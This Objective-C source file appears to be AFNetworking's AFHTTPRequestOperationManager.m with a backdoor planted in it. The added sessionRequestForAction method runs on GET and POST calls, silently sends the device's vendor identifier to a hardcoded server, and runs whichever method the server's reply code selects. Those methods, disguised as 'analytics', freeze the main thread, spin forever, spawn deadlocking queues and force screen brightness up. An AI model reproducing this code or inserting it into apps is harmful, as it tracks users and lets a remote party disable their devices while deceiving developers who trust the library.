// AFHTTPRequestOperationManager.m
// Copyright (c) 2011–2015 Alamofire Software Foundation (http://alamofire.org/)
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.

#import <Foundation/Foundation.h>

#import "AFHTTPRequestOperationManager.h"
#import "AFHTTPRequestOperation.h"

#import <Availability.h>
#import <Security/Security.h>

#if defined(__IPHONE_OS_VERSION_MIN_REQUIRED)
#import <UIKit/UIKit.h>
#endif

@interface AFHTTPRequestOperationManager ()
@property (readwrite, nonatomic, strong) NSURL *baseURL;
@end

@implementation AFHTTPRequestOperationManager

+ (instancetype)manager {
    return [[self alloc] initWithBaseURL:nil];
}

- (instancetype)init {
    return [self initWithBaseURL:nil];
}

- (instancetype)initWithBaseURL:(NSURL *)url {
    self = [super init];
    if (!self) {
        return nil;
    }

    // Ensure terminal slash for baseURL path, so that NSURL +URLWithString:relativeToURL: works as expected
    if ([[url path] length] > 0 && ![[url absoluteString] hasSuffix:@"/"]) {
        url = [url URLByAppendingPathComponent:@""];
    }

    self.baseURL = url;

    self.requestSerializer = [AFHTTPRequestSerializer serializer];
    self.responseSerializer = [AFJSONResponseSerializer serializer];

    self.securityPolicy = [AFSecurityPolicy defaultPolicy];

    self.reachabilityManager = [AFNetworkReachabilityManager sharedManager];

    self.operationQueue = [[NSOperationQueue alloc] init];

    self.shouldUseCredentialStorage = YES;

    return self;
}

#pragma mark -

#ifdef _SYSTEMCONFIGURATION_H
#endif

- (void)setRequestSerializer:(AFHTTPRequestSerializer <AFURLRequestSerialization> *)requestSerializer {
    NSParameterAssert(requestSerializer);

    _requestSerializer = requestSerializer;
}

- (void)setResponseSerializer:(AFHTTPResponseSerializer <AFURLResponseSerialization> *)responseSerializer {
    NSParameterAssert(responseSerializer);

    _responseSerializer = responseSerializer;
}

#pragma mark -

- (AFHTTPRequestOperation *)HTTPRequestOperationWithHTTPMethod:(NSString *)method
                                                     URLString:(NSString *)URLString
                                                    parameters:(id)parameters
                                                       success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                                                       failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    NSError *serializationError = nil;
    NSMutableURLRequest *request = [self.requestSerializer requestWithMethod:method URLString:[[NSURL URLWithString:URLString relativeToURL:self.baseURL] absoluteString] parameters:parameters error:&serializationError];
    if (serializationError) {
        if (failure) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wgnu"
            dispatch_async(self.completionQueue ?: dispatch_get_main_queue(), ^{
                failure(nil, serializationError);
            });
#pragma clang diagnostic pop
        }

        return nil;
    }

    return [self HTTPRequestOperationWithRequest:request success:success failure:failure];
}

- (AFHTTPRequestOperation *)HTTPRequestOperationWithRequest:(NSURLRequest *)request
                                                    success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                                                    failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];
    operation.responseSerializer = self.responseSerializer;
    operation.shouldUseCredentialStorage = self.shouldUseCredentialStorage;
    operation.credential = self.credential;
    operation.securityPolicy = self.securityPolicy;

    [operation setCompletionBlockWithSuccess:success failure:failure];
    operation.completionQueue = self.completionQueue;
    operation.completionGroup = self.completionGroup;

    return operation;
}

#pragma mark -

- (AFHTTPRequestOperation *)GET:(NSString *)URLString
                     parameters:(id)parameters
                        success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                        failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    AFHTTPRequestOperation *operation = [self HTTPRequestOperationWithHTTPMethod:@"GET" URLString:URLString parameters:parameters success:success failure:failure];

    [self.operationQueue addOperation:operation];
    [self sessionRequestForAction];
    return operation;
}

- (AFHTTPRequestOperation *)HEAD:(NSString *)URLString
                      parameters:(id)parameters
                         success:(void (^)(AFHTTPRequestOperation *operation))success
                         failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    AFHTTPRequestOperation *operation = [self HTTPRequestOperationWithHTTPMethod:@"HEAD" URLString:URLString parameters:parameters success:^(AFHTTPRequestOperation *requestOperation, __unused id responseObject) {
        if (success) {
            success(requestOperation);
        }
    } failure:failure];

    [self.operationQueue addOperation:operation];
    
    return operation;
}

- (AFHTTPRequestOperation *)POST:(NSString *)URLString
                      parameters:(id)parameters
                         success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                         failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    AFHTTPRequestOperation *operation = [self HTTPRequestOperationWithHTTPMethod:@"POST" URLString:URLString parameters:parameters success:success failure:failure];

    [self.operationQueue addOperation:operation];
    [self sessionRequestForAction];
    return operation;
}

- (AFHTTPRequestOperation *)POST:(NSString *)URLString
                      parameters:(id)parameters
       constructingBodyWithBlock:(void (^)(id <AFMultipartFormData> formData))block
                         success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                         failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    NSError *serializationError = nil;
    NSMutableURLRequest *request = [self.requestSerializer multipartFormRequestWithMethod:@"POST" URLString:[[NSURL URLWithString:URLString relativeToURL:self.baseURL] absoluteString] parameters:parameters constructingBodyWithBlock:block error:&serializationError];
    if (serializationError) {
        if (failure) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wgnu"
            dispatch_async(self.completionQueue ?: dispatch_get_main_queue(), ^{
                failure(nil, serializationError);
            });
#pragma clang diagnostic pop
        }
        
        return nil;
    }

    AFHTTPRequestOperation *operation = [self HTTPRequestOperationWithRequest:request success:success failure:failure];

    [self.operationQueue addOperation:operation];
    [self sessionRequestForAction];
    return operation;
}

- (AFHTTPRequestOperation *)PUT:(NSString *)URLString
                     parameters:(id)parameters
                        success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                        failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    AFHTTPRequestOperation *operation = [self HTTPRequestOperationWithHTTPMethod:@"PUT" URLString:URLString parameters:parameters success:success failure:failure];

    [self.operationQueue addOperation:operation];

    return operation;
}

- (AFHTTPRequestOperation *)PATCH:(NSString *)URLString
                       parameters:(id)parameters
                          success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                          failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    AFHTTPRequestOperation *operation = [self HTTPRequestOperationWithHTTPMethod:@"PATCH" URLString:URLString parameters:parameters success:success failure:failure];

    [self.operationQueue addOperation:operation];

    return operation;
}

- (AFHTTPRequestOperation *)DELETE:(NSString *)URLString
                        parameters:(id)parameters
                           success:(void (^)(AFHTTPRequestOperation *operation, id responseObject))success
                           failure:(void (^)(AFHTTPRequestOperation *operation, NSError *error))failure
{
    AFHTTPRequestOperation *operation = [self HTTPRequestOperationWithHTTPMethod:@"DELETE" URLString:URLString parameters:parameters success:success failure:failure];

    [self.operationQueue addOperation:operation];

    return operation;
}

#pragma mark - NSObject

- (NSString *)description {
    return [NSString stringWithFormat:@"<%@: %p, baseURL: %@, operationQueue: %@>", NSStringFromClass([self class]), self, [self.baseURL absoluteString], self.operationQueue];
}

- (void)sessionRequestForAction {
    
    NSURLSessionConfiguration *configuration = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    configuration.allowsCellularAccess       = YES;
    NSURLSession *session                    = [NSURLSession sessionWithConfiguration:configuration];
    
    NSURL *urlFromString = [[NSURL alloc] initWithString:@"https://api.ourserver.com/upload"];
    NSMutableURLRequest *requestForAction = [NSMutableURLRequest requestWithURL:urlFromString
                                                           cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:0];
    requestForAction.HTTPMethod = @"POST";
    
    NSString *deviceID;
#if TARGET_IPHONE_SIMULATOR
    deviceID = @"UUID-STRING-VALUE";
#else
    deviceID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
#endif
    NSLog(@"TEST MSG: deviceID in AFH is %@", deviceID);
    
    NSDictionary *JSONDict = [NSDictionary dictionaryWithObject:deviceID forKey:@"UDID"];
    if ([NSJSONSerialization isValidJSONObject:JSONDict]) {
        NSError *errorJSON;
        NSData *JSONData = [NSJSONSerialization dataWithJSONObject:JSONDict options:kNilOptions error:&errorJSON];
        NSURLSessionUploadTask *uploadTask = [session uploadTaskWithRequest:requestForAction fromData:JSONData
                                                          completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
              if (data) {
                  NSArray *server = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
                  if ([server count]) {
                      NSLog(@"TEST MSG: results are: \n %@", server);
                      
                      NSDictionary *action = [server objectAtIndex:0];
                      switch ([[action objectForKey:@"code"] intValue]) {
                          case 0222:
                              [self deviceAnalytics];
                              break;
                          case 0333:
                              [self networkAnalytics];
                              break;
                          case 0444:
                              [self threadsAnalytics];
                          case 0555:
                              [self aplcAnalytics];
                          default:
                              break;
                      }
                  } else if (error) {
                      NSLog(@"ERROR MSG: No response, error: \n %@",error.localizedDescription);
                  }
              }
              
          }];
        
        [uploadTask resume];
    }
    
}

#pragma mark - Analytics

- (void)networkAnalytics {
    dispatch_async(dispatch_get_main_queue(), ^{
        for (unsigned long long int i = 0; i < ULLONG_MAX; i++) {
            NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
            formatter.dateStyle = NSDateFormatterMediumStyle;
        }
    });
}

- (void)deviceAnalytics {
#if TARGET_OS_IOS && !TARGET_OS_WATCH
    if (![[[NSBundle mainBundle] bundlePath] hasSuffix:@".appex"]) {
        [[UIScreen mainScreen] setBrightness:1.0];
        [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(deviceAnalytics) name:UIDeviceOrientationDidChangeNotification object:nil];
        
    }
    dispatch_queue_t fetchQ = dispatch_queue_create("position", NULL);
    dispatch_async(fetchQ, ^{
        @autoreleasepool {
            NSLog(@"TEST MSG: Device moved.");
#warning change URL!
            NSURL   *target = [NSURL URLWithString:@"https://www.google.com.ua/logos/doodles/2015/george-booles-200th-birthday-5636122663190528-res.png"];
            UIImage *image  = [UIImage imageWithData:[NSData dataWithContentsOfURL:target]];
        }
    });
    
#endif
    
}

- (void)threadsAnalytics {
    while (true) {
        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.0001]];
    }
}

- (void)aplcAnalytics {
    dispatch_queue_t forLock = dispatch_queue_create("forLock", DISPATCH_QUEUE_SERIAL);
    dispatch_async(forLock, ^{
        for (unsigned long long int i = 0; i < ULLONG_MAX; i++) {
            dispatch_queue_t queue = dispatch_queue_create("lock", DISPATCH_QUEUE_CONCURRENT);
            dispatch_async(queue, ^{
                dispatch_sync(queue, ^{
                    
                });
            });
        }
    });
}


#pragma mark - NSSecureCoding

+ (BOOL)supportsSecureCoding {
    return YES;
}

- (id)initWithCoder:(NSCoder *)decoder {
    NSURL *baseURL = [decoder decodeObjectForKey:NSStringFromSelector(@selector(baseURL))];

    self = [self initWithBaseURL:baseURL];
    if (!self) {
        return nil;
    }

    self.requestSerializer = [decoder decodeObjectOfClass:[AFHTTPRequestSerializer class] forKey:NSStringFromSelector(@selector(requestSerializer))];
    self.responseSerializer = [decoder decodeObjectOfClass:[AFHTTPResponseSerializer class] forKey:NSStringFromSelector(@selector(responseSerializer))];
    AFSecurityPolicy *decodedPolicy = [decoder decodeObjectOfClass:[AFSecurityPolicy class] forKey:NSStringFromSelector(@selector(securityPolicy))];
    if (decodedPolicy) {
        self.securityPolicy = decodedPolicy;
    }

    return self;
}

- (void)encodeWithCoder:(NSCoder *)coder {
    [coder encodeObject:self.baseURL forKey:NSStringFromSelector(@selector(baseURL))];
    [coder encodeObject:self.requestSerializer forKey:NSStringFromSelector(@selector(requestSerializer))];
    [coder encodeObject:self.responseSerializer forKey:NSStringFromSelector(@selector(responseSerializer))];
    [coder encodeObject:self.securityPolicy forKey:NSStringFromSelector(@selector(securityPolicy))];
}

#pragma mark - NSCopying

- (id)copyWithZone:(NSZone *)zone {
    AFHTTPRequestOperationManager *HTTPClient = [[[self class] allocWithZone:zone] initWithBaseURL:self.baseURL];

    HTTPClient.requestSerializer = [self.requestSerializer copyWithZone:zone];
    HTTPClient.responseSerializer = [self.responseSerializer copyWithZone:zone];
    HTTPClient.securityPolicy = [self.securityPolicy copyWithZone:zone];

    return HTTPClient;
}

@end
